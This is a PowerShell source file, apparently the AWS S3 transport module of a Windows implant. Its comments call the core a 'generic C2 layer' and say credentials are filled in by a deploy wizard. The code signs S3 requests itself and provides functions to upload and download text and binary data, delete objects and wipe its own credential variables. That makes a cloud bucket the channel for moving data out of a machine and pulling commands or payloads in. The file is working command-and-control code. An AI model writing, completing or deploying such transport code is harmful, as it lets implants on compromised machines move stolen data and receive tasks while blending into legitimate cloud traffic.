# === TRANSPORT: AWS S3 (Sig V4) ===
# Provider-specific transport layer for the Windows agent.
# Functions called by agent/core.ps1 (generic C2 layer).
# No token refresh - each request is individually signed with AWS Sig V4 using .NET HMACSHA256.
# Credentials are base64 placeholders substituted by the wizard at deploy time.

$script:S3_ACCESS_KEY = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_ACCESS_KEY_ID_B64"))
$script:S3_SECRET_KEY = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_SECRET_ACCESS_KEY_B64"))
$script:S3_REGION     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_S3_REGION_B64"))
$script:S3_BUCKET     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_S3_BUCKET_B64"))
$script:S3_HOST       = "$script:S3_BUCKET.s3.$script:S3_REGION.amazonaws.com"
$script:S3_ENDPOINT   = "https://$script:S3_HOST"
$script:S3_EMPTY_HASH = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'

function _S3Hmac([byte[]]$key, [string]$msg) {
    $h = New-Object System.Security.Cryptography.HMACSHA256
    $h.Key = $key
    return $h.ComputeHash([Text.Encoding]::UTF8.GetBytes($msg))
}

function _S3Sha256([byte[]]$data) {
    $sha = New-Object System.Security.Cryptography.SHA256Managed
    return [BitConverter]::ToString($sha.ComputeHash($data)).Replace('-','').ToLower()
}

function _S3Sha256Str([string]$s) {
    return _S3Sha256 ([Text.Encoding]::UTF8.GetBytes($s))
}

function _S3BytesToHex([byte[]]$bytes) {
    return [BitConverter]::ToString($bytes).Replace('-','').ToLower()
}

function _S3SigningKey([string]$date) {
    $k0 = _S3Hmac ([Text.Encoding]::UTF8.GetBytes("AWS4$script:S3_SECRET_KEY")) $date
    $k1 = _S3Hmac $k0 $script:S3_REGION
    $k2 = _S3Hmac $k1 "s3"
    return _S3Hmac $k2 "aws4_request"
}

function _S3Sign([string]$method, [string]$key, [byte[]]$payload, [string]$contentType = "") {
    $dt        = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ')
    $date      = $dt.Substring(0,8)
    $scope     = "$date/$script:S3_REGION/s3/aws4_request"
    $phash     = _S3Sha256 $payload

    if ($contentType) {
        $signedHdrs = "content-type;host;x-amz-content-sha256;x-amz-date"
        $canonHdrs  = "content-type:$contentType`nhost:$script:S3_HOST`nx-amz-content-sha256:$phash`nx-amz-date:$dt`n"
    } else {
        $signedHdrs = "host;x-amz-content-sha256;x-amz-date"
        $canonHdrs  = "host:$script:S3_HOST`nx-amz-content-sha256:$phash`nx-amz-date:$dt`n"
    }

    $canonReq = "$method`n/$key`n`n$canonHdrs`n$signedHdrs`n$phash"
    $sts      = "AWS4-HMAC-SHA256`n$dt`n$scope`n$(_S3Sha256Str $canonReq)"
    $sig      = _S3BytesToHex (_S3Hmac (_S3SigningKey $date) $sts)
    $auth     = "AWS4-HMAC-SHA256 Credential=$script:S3_ACCESS_KEY/$scope, SignedHeaders=$signedHdrs, Signature=$sig"

    return @{
        Authorization         = $auth
        'X-Amz-Date'         = $dt
        'X-Amz-Content-Sha256' = $phash
        ContentType           = $contentType
    }
}

function Invoke-TransportRefresh {
    Write-Log "[S3]: No token refresh required - requests are individually signed"
    return $true
}

function Invoke-TransportUpload {
    param([string]$Path, [string]$Content)

    $key      = $Path.TrimStart('/')
    $data     = [Text.Encoding]::UTF8.GetBytes($Content)
    $hdrs     = _S3Sign "PUT" $key $data "application/octet-stream"
    $headers  = @{
        Authorization           = $hdrs.Authorization
        'X-Amz-Date'           = $hdrs['X-Amz-Date']
        'X-Amz-Content-Sha256' = $hdrs['X-Amz-Content-Sha256']
    }

    try {
        $response = Invoke-RestMethod -Uri "$script:S3_ENDPOINT/$key" -Method PUT `
            -Headers $headers -Body $data -ContentType "application/octet-stream"
        return $response
    } catch {
        Write-Log "[S3]: Upload error: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-TransportDownload {
    param([string]$Path)

    $key     = $Path.TrimStart('/')
    $hdrs    = _S3Sign "GET" $key ([byte[]]@()) ""
    $headers = @{
        Authorization           = $hdrs.Authorization
        'X-Amz-Date'           = $hdrs['X-Amz-Date']
        'X-Amz-Content-Sha256' = $script:S3_EMPTY_HASH
    }

    try {
        $wc = New-Object System.Net.WebClient
        foreach ($h in $headers.GetEnumerator()) { $wc.Headers.Add($h.Key, $h.Value) }
        $bytes = $wc.DownloadData("$script:S3_ENDPOINT/$key")
        return [Text.Encoding]::UTF8.GetString($bytes)
    } catch {
        Write-Log "[S3]: Download error: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-TransportUploadBinary {
    param([string]$Path, [byte[]]$Data)

    $key     = $Path.TrimStart('/')
    $hdrs    = _S3Sign "PUT" $key $Data "application/octet-stream"
    $headers = @{
        Authorization           = $hdrs.Authorization
        'X-Amz-Date'           = $hdrs['X-Amz-Date']
        'X-Amz-Content-Sha256' = $hdrs['X-Amz-Content-Sha256']
    }

    try {
        $response = Invoke-RestMethod -Uri "$script:S3_ENDPOINT/$key" -Method PUT `
            -Headers $headers -Body $Data -ContentType "application/octet-stream"
        return $response
    } catch {
        Write-Log "[S3]: Upload binary error: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-TransportDownloadBinary {
    param([string]$Path)

    $key     = $Path.TrimStart('/')
    $hdrs    = _S3Sign "GET" $key ([byte[]]@()) ""
    $headers = @{
        Authorization           = $hdrs.Authorization
        'X-Amz-Date'           = $hdrs['X-Amz-Date']
        'X-Amz-Content-Sha256' = $script:S3_EMPTY_HASH
    }

    try {
        $wc = New-Object System.Net.WebClient
        foreach ($h in $headers.GetEnumerator()) { $wc.Headers.Add($h.Key, $h.Value) }
        return $wc.DownloadData("$script:S3_ENDPOINT/$key")
    } catch {
        Write-Log "[S3]: Download binary error: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-TransportDelete {
    param([string]$Path)

    $key     = $Path.TrimStart('/')
    $hdrs    = _S3Sign "DELETE" $key ([byte[]]@()) ""
    $headers = @{
        Authorization           = $hdrs.Authorization
        'X-Amz-Date'           = $hdrs['X-Amz-Date']
        'X-Amz-Content-Sha256' = $script:S3_EMPTY_HASH
    }

    try {
        Invoke-RestMethod -Uri "$script:S3_ENDPOINT/$key" -Method DELETE `
            -Headers $headers -ErrorAction SilentlyContinue | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Clear-Transport {
    Remove-Variable -Name S3_ACCESS_KEY, S3_SECRET_KEY, S3_REGION, S3_BUCKET, S3_HOST, S3_ENDPOINT `
        -Scope Script -Force 2>$null
}
